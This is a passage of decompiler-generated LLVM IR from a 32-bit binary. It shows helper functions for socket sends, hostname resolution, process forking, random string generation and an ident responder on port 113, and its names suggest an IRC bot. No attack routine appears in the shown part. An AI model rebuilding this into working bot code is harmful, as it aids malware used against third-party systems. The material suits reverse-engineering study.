  br i1 %v1_8048299, label %dec_label_pc_80482a6, label %dec_label_pc_80482ad

dec_label_pc_80482a6:                             ; preds = %dec_label_pc_8048286, %dec_label_pc_8048265
  br label %dec_label_pc_80482ad

dec_label_pc_80482ad:                             ; preds = %dec_label_pc_804827c, %dec_label_pc_8048286, %dec_label_pc_80482a6
  %storemerge6 = phi i32 [ 0, %dec_label_pc_80482a6 ], [ 1, %dec_label_pc_8048286 ], [ 1, %dec_label_pc_804827c ]
  br label %dec_label_pc_8048348

dec_label_pc_80482b8:                             ; preds = %dec_label_pc_8048243
  %v2_80482bb = load i8, i8* %tmp13, align 1
  %v4_80482be = icmp eq i8 %v2_80482bb, 0
  br i1 %v4_80482be, label %dec_label_pc_80482ea, label %dec_label_pc_80482c2

dec_label_pc_80482c2:                             ; preds = %dec_label_pc_80482b8
  %v1_80482c5 = add i32 %arg2, 1
  %v1_80482c9 = add i32 %v4_8048231, 1
  %v4_80482ce = inttoptr i32 %v1_80482c9 to i8*
  %v5_80482d1 = call i32 @strwildmatch(i8* %v4_80482ce, i32 %v1_80482c5)
  %v1_80482d6 = icmp ne i32 %v5_80482d1, 0
  %. = zext i1 %v1_80482d6 to i32
  br label %dec_label_pc_80482ea

dec_label_pc_80482ea:                             ; preds = %dec_label_pc_80482c2, %dec_label_pc_80482b8
  %storemerge5 = phi i32 [ 1, %dec_label_pc_80482b8 ], [ %., %dec_label_pc_80482c2 ]
  br label %dec_label_pc_8048348

dec_label_pc_80482f2:                             ; preds = %dec_label_pc_8048249
  %v2_80482f5 = load i8, i8* %arg1, align 1
  %v3_80482f5 = zext i8 %v2_80482f5 to i32
  %v2_80482fe = call i32 @__GI_toupper(i32 %v3_80482f5)
  store i32 %v2_80482fe, i32* @ebx, align 4
  %v2_8048308 = load i8, i8* %tmp13, align 1
  %v3_8048308 = zext i8 %v2_8048308 to i32
  %v2_8048311 = call i32 @__GI_toupper(i32 %v3_8048308)
  %v0_8048316 = load i32, i32* @ebx, align 4
  %v12_8048316 = icmp eq i32 %v0_8048316, %v2_8048311
  %v1_8048318 = icmp eq i1 %v12_8048316, false
  br i1 %v1_8048318, label %dec_label_pc_8048342, label %dec_label_pc_804831a

dec_label_pc_804831a:                             ; preds = %dec_label_pc_80482f2
  %v1_804831d = add i32 %arg2, 1
  %v1_8048321 = add i32 %v4_8048231, 1
  %v4_8048326 = inttoptr i32 %v1_8048321 to i8*
  %v5_8048329 = call i32 @strwildmatch(i8* %v4_8048326, i32 %v1_804831d)
  %v1_804832e = icmp ne i32 %v5_8048329, 0
  %.7 = zext i1 %v1_804832e to i32
  br label %dec_label_pc_8048342

dec_label_pc_8048342:                             ; preds = %dec_label_pc_804831a, %dec_label_pc_80482f2
  %storemerge = phi i32 [ 1, %dec_label_pc_80482f2 ], [ %.7, %dec_label_pc_804831a ]
  br label %dec_label_pc_8048348

dec_label_pc_8048348:                             ; preds = %dec_label_pc_8048254, %dec_label_pc_80482ea, %dec_label_pc_80482ad, %dec_label_pc_8048342
  %stack_var_-24.0 = phi i32 [ %storemerge6, %dec_label_pc_80482ad ], [ %storemerge5, %dec_label_pc_80482ea ], [ %v3_8048257, %dec_label_pc_8048254 ], [ %storemerge, %dec_label_pc_8048342 ]
  %v2_804834e = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804834e, i32* @ebx, align 4
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i8 %v2_8048234, { 2, 0, 1 }
  uselistorder i32 (i32)* @__GI_toupper, { 1, 0 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder i8* %arg1, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048348, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_80482ad, { 2, 1, 0 }
}

define i32 @Send(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8048354 = load i32, i32* @edi, align 4
  store i32 %v0_8048354, i32* %stack_var_-8, align 4
  %v4_804835b = ptrtoint i32* %stack_var_12 to i32
  %v5_8048373 = call i32 @vsprintf(i32 ptrtoint (i8** @global_var_80537a0.253 to i32), i32 %arg2, i32 %v4_804835b)
  store i1 false, i1* @df, align 1
  store i32 ptrtoint (i8** @global_var_80537a0.253 to i32), i32* @edi, align 4
  %v3_804838b = call i32 @_strlen(i8* bitcast (i8** @global_var_80537a0.253 to i8*))
  %v6_80483a4 = call i32 @__libc_write(i32 %arg1, i32* bitcast (i8** @global_var_80537a0.253 to i32*), i32 %v3_804838b)
  %v0_80483a9 = load i32, i32* @esp, align 4
  %v1_80483a9 = add i32 %v0_80483a9, 36
  %v6_80483a9 = xor i32 %v0_80483a9, -2147483648
  %v7_80483a9 = and i32 %v1_80483a9, %v6_80483a9
  %v8_80483a9 = icmp slt i32 %v7_80483a9, 0
  store i1 %v8_80483a9, i1* @of, align 1
  %v2_80483ac = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80483ac, i32* @edi, align 4
  ret i32 %v6_80483a4
}

define i32 @host2ip(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_80483af = load i32, i32* @ebp, align 4
  store i32 %v0_80483af, i32* %stack_var_-4, align 4
  %v4_80483af = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80483af, i32* @ebp, align 4
  %v1_80483bb = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_80483bb, i32* @global_var_8053ba0.254, align 32
  %v10_80483ca = icmp eq i32 %v1_80483bb, -1
  %v1_80483cd = icmp eq i1 %v10_80483ca, false
  br i1 %v1_80483cd, label %dec_label_pc_8048414, label %dec_label_pc_80483cf

dec_label_pc_80483cf:                             ; preds = %entry
  %v1_80483d5 = call i32 @__GI_gethostbyname(i32 %arg1)
  store i32 %v1_80483d5, i32* @eax, align 4
  %v4_80483dd = icmp eq i32 %v1_80483d5, 0
  %v1_80483e1 = icmp eq i1 %v4_80483dd, false
  br i1 %v1_80483e1, label %dec_label_pc_80483ef, label %dec_label_pc_80483e3

dec_label_pc_80483e3:                             ; preds = %dec_label_pc_80483cf
  %v1_80483ea = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80483ef

dec_label_pc_80483ef:                             ; preds = %dec_label_pc_80483cf, %dec_label_pc_80483e3
  %v1_80483f2 = add i32 %v1_80483d5, 12
  %v2_80483f2 = inttoptr i32 %v1_80483f2 to i32*
  %v3_80483f2 = load i32, i32* %v2_80483f2, align 4
  %v1_80483ff = add i32 %v1_80483d5, 16
  %v2_80483ff = inttoptr i32 %v1_80483ff to i32*
  %v3_80483ff = load i32, i32* %v2_80483ff, align 4
  %v1_8048402 = inttoptr i32 %v3_80483ff to i32*
  %v2_8048402 = load i32, i32* %v1_8048402, align 4
  %v3_804840f = call i32 @bcopy(i32 %v2_8048402, i32 ptrtoint (i32* @global_var_8053ba0.254 to i32), i32 %v3_80483f2)
  %v0_8048414.pre = load i32, i32* @global_var_8053ba0.254, align 32
  br label %dec_label_pc_8048414

dec_label_pc_8048414:                             ; preds = %entry, %dec_label_pc_80483ef
  %v0_8048414 = phi i32 [ %v1_80483bb, %entry ], [ %v0_8048414.pre, %dec_label_pc_80483ef ]
  %v2_8048419 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048419, i32* @ebp, align 4
  ret i32 %v0_8048414

; uselistorder directives
  uselistorder i32 %v1_80483bb, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8048414, { 1, 0 }
  uselistorder label %dec_label_pc_80483ef, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8048421 = load i8, i8* @global_var_8053784.255, align 4
  %v10_8048428 = icmp eq i8 %v0_8048421, 1
  %v1_804842a = icmp eq i1 %v10_8048428, false
  br i1 %v1_804842a, label %dec_label_pc_8048438, label %dec_label_pc_80484d6

dec_label_pc_8048438:                             ; preds = %entry
  %v0_8048438 = call i32 @__libc_fork()
  %v4_8048440 = icmp eq i32 %v0_8048438, 0
  %v1_8048444 = icmp eq i1 %v4_8048440, false
  br i1 %v1_8048444, label %dec_label_pc_8048451, label %dec_label_pc_8048446

dec_label_pc_8048446:                             ; preds = %dec_label_pc_8048438
  br label %dec_label_pc_80484d6

dec_label_pc_8048451:                             ; preds = %dec_label_pc_8048438
  %v0_8048451 = load i32, i32* @global_var_8053790.256, align 16
  %v1_8048456 = add i32 %v0_8048451, 1
  store i32 %v1_8048456, i32* @global_var_8053790.256, align 16
  %v2_8048461 = mul i32 %v1_8048456, 4
  %v1_8048464 = add i32 %v2_8048461, 4
  %v1_804846a = call i32 @malloc(i32 %v1_8048464)
  %v0_804849d7 = load i32, i32* @global_var_8053790.256, align 16
  %v6_80484a69 = icmp eq i32 %v0_804849d7, 1
  br i1 %v6_80484a69, label %dec_label_pc_80484a8, label %dec_label_pc_804847b

dec_label_pc_804847b:                             ; preds = %dec_label_pc_8048451, %dec_label_pc_804847b
  %storemerge10 = phi i32 [ %v4_804849a, %dec_label_pc_804847b ], [ 0, %dec_label_pc_8048451 ]
  %v2_804847e = mul i32 %storemerge10, 4
  %v5_8048483 = add i32 %v2_804847e, %v1_804846a
  store i32 %v5_8048483, i32* @ecx, align 4
  %v0_804848e = load i32, i32* @global_var_8055e2c.257, align 4
  %v2_8048493 = add i32 %v0_804848e, %v2_804847e
  %v1_8048496 = inttoptr i32 %v2_8048493 to i32*
  %v2_8048496 = load i32, i32* %v1_8048496, align 4
  %v2_8048498 = inttoptr i32 %v5_8048483 to i32*
  store i32 %v2_8048496, i32* %v2_8048498, align 4
  %v4_804849a = add i32 %storemerge10, 1
  %v0_804849d = load i32, i32* @global_var_8053790.256, align 16
  %v1_80484a2 = add i32 %v0_804849d, -1
  %v6_80484a6 = icmp ugt i32 %v1_80484a2, %v4_804849a
  br i1 %v6_80484a6, label %dec_label_pc_804847b, label %dec_label_pc_80484a8

dec_label_pc_80484a8:                             ; preds = %dec_label_pc_804847b, %dec_label_pc_8048451
  %v0_804849d.lcssa = phi i32 [ %v0_804849d7, %dec_label_pc_8048451 ], [ %v0_804849d, %dec_label_pc_804847b ]
  %v2_80484ad = mul i32 %v0_804849d.lcssa, 4
  %v5_80484b0 = add i32 %v2_80484ad, %v1_804846a
  %v1_80484b3 = add i32 %v5_80484b0, -4
  store i32 %v1_80484b3, i32* @edx, align 4
  %v2_80484b9 = inttoptr i32 %v1_80484b3 to i32*
  store i32 %v0_8048438, i32* %v2_80484b9, align 4
  %v0_80484bb = load i32, i32* @global_var_8055e2c.257, align 4
  %v1_80484c3 = call i32 @free(i32 %v0_80484bb)
  store i32 %v1_804846a, i32* @global_var_8055e2c.257, align 4
  br label %dec_label_pc_80484d6

dec_label_pc_80484d6:                             ; preds = %entry, %dec_label_pc_8048446, %dec_label_pc_80484a8
  %stack_var_-24.0 = phi i32 [ %v0_8048438, %dec_label_pc_80484a8 ], [ %v0_8048438, %dec_label_pc_8048446 ], [ 1, %entry ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %v4_804849a, { 1, 0 }
  uselistorder i32 %v2_804847e, { 1, 0 }
  uselistorder i32 %storemerge10, { 1, 0 }
  uselistorder i32 %v0_804849d7, { 1, 0 }
  uselistorder i32 %v1_804846a, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80484d6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804847b, { 1, 0 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8048503 = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_8048503

dec_label_pc_80484e4:                             ; preds = %dec_label_pc_8048526, %dec_label_pc_8048503
  %v3_80484f5 = call i32 @_strlen(i8* %arg1)
  %v6_80484fc = add i32 %v4_8048503, %v3_80484f5
  %v1_80484ff = add i32 %v6_80484fc, -1
  %v1_8048500 = inttoptr i32 %v1_80484ff to i8*
  store i8 0, i8* %v1_8048500, align 1
  br label %dec_label_pc_8048503

dec_label_pc_8048503:                             ; preds = %entry, %dec_label_pc_80484e4
  %v3_8048514 = call i32 @_strlen(i8* %arg1)
  %v6_804851b = add i32 %v4_8048503, %v3_8048514
  %v1_804851e = add i32 %v6_804851b, -1
  %v1_804851f = inttoptr i32 %v1_804851e to i8*
  %v2_804851f = load i8, i8* %v1_804851f, align 1
  %v10_8048522 = icmp eq i8 %v2_804851f, 13
  br i1 %v10_8048522, label %dec_label_pc_80484e4, label %dec_label_pc_8048526

dec_label_pc_8048526:                             ; preds = %dec_label_pc_8048503
  %v3_8048537 = call i32 @_strlen(i8* %arg1)
  %v6_804853e = add i32 %v4_8048503, %v3_8048537
  %v1_8048541 = add i32 %v6_804853e, -1
  %v1_8048542 = inttoptr i32 %v1_8048541 to i8*
  %v2_8048542 = load i8, i8* %v1_8048542, align 1
  %v11_8048545 = icmp eq i8 %v2_8048542, 10
  br i1 %v11_8048545, label %dec_label_pc_80484e4, label %dec_label_pc_8048549

dec_label_pc_8048549:                             ; preds = %dec_label_pc_8048526
  %v1_804854e = sext i8 %v2_8048542 to i32
  ret i32 %v1_804854e

; uselistorder directives
  uselistorder i8 %v2_8048542, { 1, 0 }
  uselistorder i32 %v4_8048503, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_8048503, { 1, 0 }
}

define i32 @makestring(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i8*, align 4
  %stack_var_-1064 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8048552 = load i32, i32* @edi, align 4
  %v0_8048553 = load i32, i32* @esi, align 4
  %v0_8048554 = load i32, i32* @ebx, align 4
  store i32 %v0_8048554, i32* %stack_var_-16, align 4
  %v1_804855b = call i32 @random()
  %v2_804857d = sdiv i32 %v1_804855b, 5
  store i32 %v2_804857d, i32* @ebx, align 4
  %tmp28 = mul i32 %v2_804857d, -5
  %v2_8048596 = add i32 %tmp28, %v1_804855b
  store i32 %v2_8048596, i32* @esi, align 4
  %v1_80485a4 = add i32 %v2_8048596, 4
  %v1_80485ad = add i32 %v2_8048596, 5
  %v2_80485b1 = call i32 @malloc(i32 %v1_80485ad)
  %tmp29 = bitcast i8** %stack_var_-40 to i32*
  store i32 %v2_80485b1, i32* %tmp29, align 4
  %tmp30 = inttoptr i32 %v2_80485b1 to i8*
  store i32 %v2_80485b1, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_80485c7 = and i32 %v2_80485b1, -256
  store i32 %v1_80485c7, i32* @eax, align 4
  %v5_80485c9 = call i8* @_memset(i8* %tmp30, i32 %v1_80485c7, i32 %v1_80485ad)
  %v3_80485da = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_8051332.259 to i32), i32 ptrtoint (i32* @global_var_8051330.258 to i32))
  store i32 %v3_80485da, i32* @eax, align 4
  %v4_80485e2 = icmp eq i32 %v3_80485da, 0
  %v1_80485e6 = icmp eq i1 %v4_80485e2, false
  br i1 %v1_80485e6, label %dec_label_pc_8048662, label %dec_label_pc_8048655.preheader

dec_label_pc_8048655.preheader:                   ; preds = %entry
  %v5_804865b48 = icmp sgt i32 %v1_80485a4, 0
  br i1 %v5_804865b48, label %dec_label_pc_80485f1, label %dec_label_pc_8048755

dec_label_pc_80485f1:                             ; preds = %dec_label_pc_80485f1, %dec_label_pc_8048655.preheader
  %v4_80485f6 = phi i8* [ %tmp30, %dec_label_pc_8048655.preheader ], [ %v3_8048755.pre.pre, %dec_label_pc_80485f1 ]
  %storemerge49 = phi i32 [ 0, %dec_label_pc_8048655.preheader ], [ %v4_8048652, %dec_label_pc_80485f1 ]
  store i32 %storemerge49, i32* @eax, align 4
  %v5_80485f6 = ptrtoint i8* %v4_80485f6 to i32
  %v6_80485f6 = add i32 %v5_80485f6, %storemerge49
  store i32 %v6_80485f6, i32* @ebx, align 4
  %v0_80485f9 = call i32 @random()
  %v2_804861c = srem i32 %v0_80485f9, 26
  %v14_804863f = trunc i32 %v2_804861c to i8
  %v2_804864e = add i8 %v14_804863f, 65
  %v2_8048650 = load i32, i32* @ebx, align 4
  %v3_8048650 = inttoptr i32 %v2_8048650 to i8*
  store i8 %v2_804864e, i8* %v3_8048650, align 1
  %v4_8048652 = add nuw nsw i32 %storemerge49, 1
  %exitcond = icmp eq i32 %v4_8048652, %v1_80485a4
  %v3_8048755.pre.pre = load i8*, i8** %stack_var_-40, align 4
  br i1 %exitcond, label %dec_label_pc_8048755, label %dec_label_pc_80485f1

dec_label_pc_8048662:                             ; preds = %entry
  %v1_8048662 = call i32 @random()
  store i32 %v1_8048662, i32* @eax, align 4
  store i32 %v1_8048662, i32* @ebx, align 4
  %v0_8048669 = call i32 @random()
  %v0_804866e = load i32, i32* @ebx, align 4
  %v5_8048670 = mul i32 %v0_804866e, %v0_8048669
  store i32 %v5_8048670, i32* @ecx, align 4
  %v2_8048694 = sdiv i32 %v5_8048670, 12039
  store i32 %v2_8048694, i32* @ebx, align 4
  %tmp52 = mul i32 %v2_8048694, -45402
  %v2_80486a8 = add i32 %v5_8048670, %tmp52
  store i32 %v2_80486a8, i32* @esi, align 4
  %v1_80486b6 = add i32 %v2_80486a8, 1
  %v2_80486eb = ptrtoint i32* %stack_var_-1064 to i32
  %tmp32 = bitcast i32* %stack_var_-1064 to i8*
  %v5_80486e634 = sub i32 -1, %v2_80486a8
  %v13_80486e636 = and i32 %v5_80486e634, %v1_80486b6
  %v14_80486e637 = icmp slt i32 %v13_80486e636, 0
  %v16_80486e639 = icmp slt i32 %v5_80486e634, 0
  %v2_80486e940 = icmp eq i1 %v16_80486e639, %v14_80486e637
  br i1 %v2_80486e940, label %dec_label_pc_80486eb, label %dec_label_pc_80486c3

dec_label_pc_80486c3:                             ; preds = %dec_label_pc_8048662, %dec_label_pc_80486c3
  %storemerge841 = phi i32 [ %v4_80486e0, %dec_label_pc_80486c3 ], [ 0, %dec_label_pc_8048662 ]
  %v4_80486db = call i32 @fgets(i32 %v2_80486eb, i32 1024, i32 %v3_80485da)
  %v4_80486e0 = add i32 %storemerge841, 1
  %v5_80486e6 = sub i32 %v4_80486e0, %v1_80486b6
  %v11_80486e6 = xor i32 %v4_80486e0, %v1_80486b6
  %v12_80486e6 = xor i32 %v5_80486e6, %v4_80486e0
  %v13_80486e6 = and i32 %v12_80486e6, %v11_80486e6
  %v14_80486e6 = icmp slt i32 %v13_80486e6, 0
  %v16_80486e6 = icmp slt i32 %v5_80486e6, 0
  %v2_80486e9 = icmp eq i1 %v16_80486e6, %v14_80486e6
  br i1 %v2_80486e9, label %dec_label_pc_80486eb, label %dec_label_pc_80486c3

dec_label_pc_80486eb:                             ; preds = %dec_label_pc_80486c3, %dec_label_pc_8048662
  store i32 %v2_80486eb, i32* @edx, align 4
  %v5_8048707 = call i32 @__GI_memset(i8* %tmp32, i32 0, i32 1024)
  %v4_8048724 = call i32 @fgets(i32 %v2_80486eb, i32 1024, i32 %v3_80485da)
  %v3_8048732 = call i32 @filter(i8* %tmp32)
  store i32 %v2_80485b1, i32* @edi, align 4
  store i32 %v2_80486eb, i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_8048748 = call i8* @_memcpy(i8* %tmp30, i8* %tmp32, i32 %v1_80485a4)
  %v8_8048748 = ptrtoint i8* %v7_8048748 to i32
  store i32 %v8_8048748, i32* @ecx, align 4
  store i32 %v3_80485da, i32* @eax, align 4
  %tmp33 = inttoptr i32 %v3_80485da to i16*
  %v3_8048750 = call i32 @__GI_fclose(i16* %tmp33)
  br label %dec_label_pc_8048755

dec_label_pc_8048755:                             ; preds = %dec_label_pc_80485f1, %dec_label_pc_8048655.preheader, %dec_label_pc_80486eb
  %v3_8048755 = phi i8* [ %tmp30, %dec_label_pc_80486eb ], [ %tmp30, %dec_label_pc_8048655.preheader ], [ %v3_8048755.pre.pre, %dec_label_pc_80485f1 ]
  %v4_8048755 = ptrtoint i8* %v3_8048755 to i32
  %v2_804875e = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804875e, i32* @ebx, align 4
  store i32 %v0_8048553, i32* @esi, align 4
  store i32 %v0_8048552, i32* @edi, align 4
  ret i32 %v4_8048755

; uselistorder directives
  uselistorder i32 %v5_80486e6, { 1, 0 }
  uselistorder i32 %v4_80486e0, { 3, 2, 1, 0 }
  uselistorder i32 %v5_80486e634, { 1, 0 }
  uselistorder i8* %tmp32, { 2, 1, 0 }
  uselistorder i32 %v1_80486b6, { 1, 2, 0 }
  uselistorder i32 %v2_80486a8, { 2, 1, 0 }
  uselistorder i32 %v2_8048694, { 1, 0 }
  uselistorder i32 %v5_8048670, { 1, 0, 2 }
  uselistorder i32 %v4_8048652, { 1, 0 }
  uselistorder i32 %storemerge49, { 1, 2, 0 }
  uselistorder i32 %v3_80485da, { 2, 1, 3, 0, 4, 5 }
  uselistorder i8* %tmp30, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v1_80485a4, { 2, 0, 1 }
  uselistorder i32 %v2_8048596, { 2, 1, 0 }
  uselistorder i32 %v2_804857d, { 1, 0 }
  uselistorder i32 %v1_804855b, { 1, 0 }
  uselistorder label %dec_label_pc_8048755, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80486c3, { 1, 0 }
}

define i32 @identd() local_unnamed_addr {
entry:
  %stack_var_-1092 = alloca i32, align 4
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1228 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v4_8048784 = call i32 @socket(i32 2, i32 1, i32 0)
  %v13_804878c = icmp eq i32 %v4_8048784, -1
  br i1 %v13_804878c, label %dec_label_pc_80489e2, label %dec_label_pc_8048796

dec_label_pc_8048796:                             ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  %v2_80487a3 = call i32 @htons(i16 113)
  %v2_80487b6 = ptrtoint i32* %stack_var_-52 to i32
  %v4_80487de = call i32 @bind(i32 %v4_8048784, i32 %v2_80487b6, i32 16)
  %v10_80487e3 = icmp eq i32 %v4_80487de, -1
  br i1 %v10_80487e3, label %dec_label_pc_80489e2, label %dec_label_pc_80487ec

dec_label_pc_80487ec:                             ; preds = %dec_label_pc_8048796
  %v3_80487fa = call i32 @listen(i32 %v4_8048784, i32 1)
  %v10_80487ff = icmp eq i32 %v3_80487fa, -1
  br i1 %v10_80487ff, label %dec_label_pc_80489e2, label %dec_label_pc_8048808

dec_label_pc_8048808:                             ; preds = %dec_label_pc_80487ec
  %v0_8048808 = call i32 @__libc_fork()
  %v1_804880d = icmp eq i32 %v0_8048808, 0
  br i1 %v1_804880d, label %dec_label_pc_80489e2, label %dec_label_pc_8048815

dec_label_pc_8048815:                             ; preds = %dec_label_pc_8048808
  store i32 16, i32* %stack_var_-36, align 4
  %v2_804881c = ptrtoint i32* %stack_var_-36 to i32
  %v2_804881f = ptrtoint i32* %stack_var_-68 to i32
  %v4_8048830 = call i32 @__libc_accept(i32 %v4_8048784, i32 %v2_804881f, i32 %v2_804881c)
  store i32 %v4_8048830, i32* @eax, align 4
  %v4_8048838 = add i32 %v4_8048830, 1
  %v13_8048838 = icmp eq i32 %v4_8048838, 0
  %v1_804883c = icmp eq i1 %v13_8048838, false
  br i1 %v1_804883c, label %dec_label_pc_804884a.preheader, label %dec_label_pc_804883e

dec_label_pc_804883e:                             ; preds = %dec_label_pc_8048815
  %v1_8048845 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804884a.preheader

dec_label_pc_804884a.preheader:                   ; preds = %dec_label_pc_804883e, %dec_label_pc_8048815
  %v2_8048854 = ptrtoint i32* %stack_var_-1228 to i32
  %tmp27 = bitcast i32* %stack_var_-1228 to i8*
  %v2_8048868 = udiv i32 %v4_8048830, 32
  %v1_804886e = urem i32 %v4_8048830, 32
  %v9_8048871 = shl i32 1, %v1_804886e
  %v2_8048893 = ptrtoint i32* %stack_var_-1100 to i32
  %v2_80488dd = mul nuw nsw i32 %v2_8048868, 4
  %v3_80488dd = add nsw i32 %v2_80488dd, -1224
  br label %dec_label_pc_804884a

dec_label_pc_804884a:                             ; preds = %dec_label_pc_804884a.preheader, %dec_label_pc_80488cf
  store i32 %v2_8048854, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_804885b = call i8* @_memset(i8* %tmp27, i32 0, i32 32)
  %v0_8048871 = load i32, i32* @ebp, align 4
  %v4_8048871 = add i32 %v3_80488dd, %v0_8048871
  %v5_8048871 = inttoptr i32 %v4_8048871 to i32*
  %v6_8048871 = load i32, i32* %v5_8048871, align 4
  %v12_8048871 = or i32 %v6_8048871, %v9_8048871
  store i32 %v12_8048871, i32* %v5_8048871, align 4
  store i32 60, i32* %stack_var_-1100, align 4
  %v6_80488ba = call i32 @__libc_select(i32 %v4_8048838, i32 %v2_8048854, i32 0, i32 0, i32 %v2_8048893)
  store i32 %v6_80488ba, i32* @eax, align 4
  %v2_80488bf = icmp slt i32 %v6_80488ba, 0
  %v1_80488c1 = icmp eq i1 %v2_80488bf, false
  br i1 %v1_80488c1, label %dec_label_pc_80488cf, label %dec_label_pc_80488c3

dec_label_pc_80488c3:                             ; preds = %dec_label_pc_804884a
  %v1_80488ca = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_80488cf

dec_label_pc_80488cf:                             ; preds = %dec_label_pc_804884a, %dec_label_pc_80488c3
  %v0_80488dd = load i32, i32* @ebp, align 4
  %v4_80488dd = add i32 %v3_80488dd, %v0_80488dd
  %v5_80488dd = inttoptr i32 %v4_80488dd to i32*
  %v6_80488dd = load i32, i32* %v5_80488dd, align 4
  %v10_80488dd = and i32 %v6_80488dd, %v9_8048871
  %v11_80488dd = icmp ne i32 %v10_80488dd, 0
  %v4_80488e8 = icmp eq i1 %v11_80488dd, false
  %v1_80488ea = icmp eq i1 %v4_80488e8, false
  br i1 %v1_80488ea, label %dec_label_pc_80488f1, label %dec_label_pc_804884a

dec_label_pc_80488f1:                             ; preds = %dec_label_pc_80488cf
  %v2_8048901 = ptrtoint i32* %stack_var_-1092 to i32
  %v5_8048911 = call i32 @__libc_recv(i32 %v4_8048830, i32 %v2_8048901, i32 1024, i32 0)
  store i32 %v5_8048911, i32* @eax, align 4
  %tmp28 = icmp slt i32 %v5_8048911, 1
  br i1 %tmp28, label %dec_label_pc_8048925, label %dec_label_pc_804891f

dec_label_pc_804891f:                             ; preds = %dec_label_pc_80488f1
  %v7_8048923 = icmp sgt i32 %v5_8048911, 19
  br i1 %v7_8048923, label %dec_label_pc_8048925, label %dec_label_pc_8048931

dec_label_pc_8048925:                             ; preds = %dec_label_pc_804891f, %dec_label_pc_80488f1
  %v1_804892c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8048931

dec_label_pc_8048931:                             ; preds = %dec_label_pc_804891f, %dec_label_pc_8048925
  %v0_8048934 = load i32, i32* @ebp, align 4
  %v2_8048934 = add i32 %v5_8048911, -1088
  %v3_8048934 = add i32 %v2_8048934, %v0_8048934
  %v4_8048934 = inttoptr i32 %v3_8048934 to i8*
  store i8 0, i8* %v4_8048934, align 1
  %v0_8048940 = load i32, i32* @ebp, align 4
  %v2_8048940 = add i32 %v5_8048911, -1089
  %v3_8048940 = add i32 %v2_8048940, %v0_8048940
  %v4_8048940 = inttoptr i32 %v3_8048940 to i8*
  %v5_8048940 = load i8, i8* %v4_8048940, align 1
  %v10_8048948 = icmp eq i8 %v5_8048940, 10
  br i1 %v10_8048948, label %dec_label_pc_804895c, label %dec_label_pc_804894c

dec_label_pc_804894c:                             ; preds = %dec_label_pc_8048931
  %v5_8048950 = load i8, i8* %v4_8048940, align 1
  %v10_8048958 = icmp eq i8 %v5_8048950, 13
  %v1_804895a = icmp eq i1 %v10_8048958, false
  br i1 %v1_804895a, label %dec_label_pc_8048968, label %dec_label_pc_804895c

dec_label_pc_804895c:                             ; preds = %dec_label_pc_804894c, %dec_label_pc_8048931
  store i8 0, i8* %v4_8048940, align 1
  %v0_804896e.pre = load i32, i32* @ebp, align 4
  br label %dec_label_pc_8048968

dec_label_pc_8048968:                             ; preds = %dec_label_pc_804894c, %dec_label_pc_804895c
  %v0_8048992 = phi i32 [ %v0_8048940, %dec_label_pc_804894c ], [ %v0_804896e.pre, %dec_label_pc_804895c ]
  %v2_804896e = add i32 %v5_8048911, -1090
  %v3_804896e = add i32 %v2_804896e, %v0_8048992
  %v4_804896e = inttoptr i32 %v3_804896e to i8*
  %v5_804896e = load i8, i8* %v4_804896e, align 1
  %v10_8048976 = icmp eq i8 %v5_804896e, 10
  br i1 %v10_8048976, label %dec_label_pc_804898c, label %dec_label_pc_804897a

dec_label_pc_804897a:                             ; preds = %dec_label_pc_8048968
  %v5_8048980 = load i8, i8* %v4_804896e, align 1
  %v10_8048988 = icmp eq i8 %v5_8048980, 13
  %v1_804898a = icmp eq i1 %v10_8048988, false
  br i1 %v1_804898a, label %dec_label_pc_804899a, label %dec_label_pc_804898c

dec_label_pc_804898c:                             ; preds = %dec_label_pc_804897a, %dec_label_pc_8048968
  store i8 0, i8* %v4_804896e, align 1
  br label %dec_label_pc_804899a

dec_label_pc_804899a:                             ; preds = %dec_label_pc_804897a, %dec_label_pc_804898c
  %v4_80489bb = call i32 @Send(i32 %v4_8048830, i32 ptrtoint ([25 x i8]* @global_var_8051342.261 to i32), i32 %v2_8048901)
  %v1_80489c6 = call i32 @__libc_close(i32 %v4_8048830)
  %v1_80489d1 = call i32 @__libc_close(i32 %v4_8048784)
